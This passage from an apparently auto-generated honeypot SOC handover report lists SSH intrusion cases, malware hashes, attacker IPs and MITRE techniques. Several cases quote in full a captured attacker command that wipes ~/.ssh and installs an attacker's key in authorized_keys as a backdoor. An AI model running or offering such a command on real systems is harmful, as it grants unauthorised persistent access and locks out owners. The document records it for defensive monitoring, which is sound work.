| `2026-04-22 18:45:53` | `cowrie.log.closed` |
| `2026-04-22 18:45:54` | `cowrie.session.params` |
| `2026-04-22 18:45:54` | `cowrie.command.input` |
| `2026-04-22 18:45:54` | `cowrie.session.file_download` |
| `2026-04-22 18:45:54` | `cowrie.log.closed` |
| `2026-04-22 18:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f56f9145bcad

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:45 |
| **Last Seen** | 2026-04-22 18:46 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:45:58` | `cowrie.session.connect` |
| `2026-04-22 18:45:58` | `cowrie.client.version` |
| `2026-04-22 18:45:59` | `cowrie.client.kex` |
| `2026-04-22 18:46:00` | `cowrie.login.success` |
| `2026-04-22 18:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20562a4eeea7

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:49 |
| **Last Seen** | 2026-04-22 18:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:49:05` | `cowrie.session.connect` |
| `2026-04-22 18:49:05` | `cowrie.client.version` |
| `2026-04-22 18:49:06` | `cowrie.client.kex` |
| `2026-04-22 18:49:07` | `cowrie.login.success` |
| `2026-04-22 18:49:08` | `cowrie.session.params` |
| `2026-04-22 18:49:08` | `cowrie.command.input` |
| `2026-04-22 18:49:08` | `cowrie.command.failed` |
| `2026-04-22 18:49:09` | `cowrie.log.closed` |
| `2026-04-22 18:49:09` | `cowrie.session.params` |
| `2026-04-22 18:49:09` | `cowrie.command.input` |
| `2026-04-22 18:49:10` | `cowrie.session.file_download` |
| `2026-04-22 18:49:10` | `cowrie.log.closed` |
| `2026-04-22 18:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d256b5b25407

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:49 |
| **Last Seen** | 2026-04-22 18:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:49:14` | `cowrie.session.connect` |
| `2026-04-22 18:49:14` | `cowrie.client.version` |
| `2026-04-22 18:49:14` | `cowrie.client.kex` |
| `2026-04-22 18:49:16` | `cowrie.login.success` |
| `2026-04-22 18:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76ff0fca57ca

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:55 |
| **Last Seen** | 2026-04-22 18:55 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:55:39` | `cowrie.session.connect` |
| `2026-04-22 18:55:39` | `cowrie.client.version` |
| `2026-04-22 18:55:40` | `cowrie.client.kex` |
| `2026-04-22 18:55:41` | `cowrie.login.success` |
| `2026-04-22 18:55:42` | `cowrie.session.params` |
| `2026-04-22 18:55:42` | `cowrie.command.input` |
| `2026-04-22 18:55:42` | `cowrie.command.failed` |
| `2026-04-22 18:55:43` | `cowrie.log.closed` |
| `2026-04-22 18:55:43` | `cowrie.session.params` |
| `2026-04-22 18:55:43` | `cowrie.command.input` |
| `2026-04-22 18:55:44` | `cowrie.session.file_download` |
| `2026-04-22 18:55:44` | `cowrie.log.closed` |
| `2026-04-22 18:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-708958ed0e7b

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:55 |
| **Last Seen** | 2026-04-22 18:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:55:48` | `cowrie.session.connect` |
| `2026-04-22 18:55:48` | `cowrie.client.version` |
| `2026-04-22 18:55:48` | `cowrie.client.kex` |
| `2026-04-22 18:55:50` | `cowrie.login.success` |
| `2026-04-22 18:55:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-df384efeec89

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:56 |
| **Last Seen** | 2026-04-22 18:56 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:56:44` | `cowrie.session.connect` |
| `2026-04-22 18:56:44` | `cowrie.client.version` |
| `2026-04-22 18:56:44` | `cowrie.client.kex` |
| `2026-04-22 18:56:46` | `cowrie.login.success` |
| `2026-04-22 18:56:46` | `cowrie.session.params` |
| `2026-04-22 18:56:46` | `cowrie.command.input` |
| `2026-04-22 18:56:46` | `cowrie.command.failed` |
| `2026-04-22 18:56:47` | `cowrie.log.closed` |
| `2026-04-22 18:56:48` | `cowrie.session.params` |
| `2026-04-22 18:56:48` | `cowrie.command.input` |
| `2026-04-22 18:56:48` | `cowrie.session.file_download` |
| `2026-04-22 18:56:48` | `cowrie.log.closed` |
| `2026-04-22 18:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-607e874c7144

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 18:56 |
| **Last Seen** | 2026-04-22 18:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 18:56:52` | `cowrie.session.connect` |
| `2026-04-22 18:56:52` | `cowrie.client.version` |
| `2026-04-22 18:56:52` | `cowrie.client.kex` |
| `2026-04-22 18:56:54` | `cowrie.login.success` |
| `2026-04-22 18:56:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98988d791bad

| Field | Detail |
|---|---|
| **Source IP** | `190.129.122[.]12` |
| **First Seen** | 2026-04-22 19:05 |
| **Last Seen** | 2026-04-22 19:05 |
| **Session Duration** | 28s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-22 19:05:15` | `cowrie.session.connect` |
| `2026-04-22 19:05:15` | `cowrie.client.version` |
| `2026-04-22 19:05:15` | `cowrie.client.kex` |
| `2026-04-22 19:05:17` | `cowrie.login.success` |
| `2026-04-22 19:05:18` | `cowrie.session.params` |
| `2026-04-22 19:05:18` | `cowrie.command.input` |
| `2026-04-22 19:05:18` | `cowrie.command.failed` |
| `2026-04-22 19:05:18` | `cowrie.log.closed` |
| `2026-04-22 19:05:19` | `cowrie.session.params` |
| `2026-04-22 19:05:19` | `cowrie.command.input` |
| `2026-04-22 19:05:19` | `cowrie.session.file_download` |
| `2026-04-22 19:05:19` | `cowrie.log.closed` |
| `2026-04-22 19:05:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.129.122[.]12` to AbuseIPDB if not already reported
- [ ] Block `190.129.122[.]12` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `165.154.6[.]66` | **26** | 2026-04-22 17:40 | 2026-04-22 18:32 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `190.129.122[.]185` | **26** | 2026-04-22 17:54 | 2026-04-22 18:24 | 1m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `36.103.243[.]179` | **26** | 2026-04-22 17:44 | 2026-04-22 17:50 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `43.130.90[.]166` | **26** | 2026-04-22 17:42 | 2026-04-22 18:02 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `190.129.122[.]12` | **25** | 2026-04-22 18:38 | 2026-04-22 19:09 | 1m | 24 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `165.154.227[.]8` | **8** | 2026-04-22 17:42 | 2026-04-22 18:20 | 0m | 8 | `T1110.001 · T1592` | 🟢 LOW |
| `8.216.16[.]213` | **3** | 2026-04-22 18:02 | 2026-04-22 18:03 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `163.177.76[.]83` | **2** | 2026-04-22 18:40 | 2026-04-22 18:42 | 2m | 0 | `T1592` | 🟢 LOW |
| `47.95.4[.]100` | **2** | 2026-04-22 19:16 | 2026-04-22 19:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `115.236.181[.]242` | 1 | 2026-04-22 18:38 | 2026-04-22 18:38 | 0s | 0 | `T1592` | 🟢 LOW |
| `43.134.94[.]132` | 1 | 2026-04-22 18:38 | 2026-04-22 18:38 | 0s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `163.177.76[.]83` | CN | China Unicom Guangdong province network | **100** ⚠️ | 2 |
| `47.95.4[.]100` | CN | Aliyun Computing Co., LTD | **100** ⚠️ | 7 |
| `115.236.181[.]242` | CN | Babei (China) Limited clothing | **100** ⚠️ | 2 |
| `8.216.16[.]213` | JP | Alibaba Cloud (Singapore) Private Limited | **100** ⚠️ | 23 |
| `165.154.227[.]8` | TW | Scloud Pte Ltd t/a Scloud Pte Ltd | **100** ⚠️ | 10 |
| `165.154.6[.]66` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 28 |
| `190.129.122[.]185` | BO | Entel S.A. - EntelNet | **100** ⚠️ | 50 |
| `43.134.94[.]132` | SG | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 10 |
| `36.103.243[.]179` | CN | CHINANET ningxia province network | **100** ⚠️ | 50 |
| `43.130.90[.]166` | US | Asia Pacific Network Information Center, Pty. Ltd. | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 246 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 138 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 106 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 53 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 53 |

---

## 🔕 False Positive Summary (8 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 14 below threshold 25 | 1 |
| AbuseIPDB score 24 below threshold 25 | 3 |
| AbuseIPDB score 5 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 1 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 258 cases |
| Tool 34  | Credential Extractor        | ✅ 245 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 5 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 17 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 8 filtered (3.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 104 priority case(s) shown individually · 11 recon entry/entries in table (9 group(s) consolidating 144 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-22T19:20:29Z_
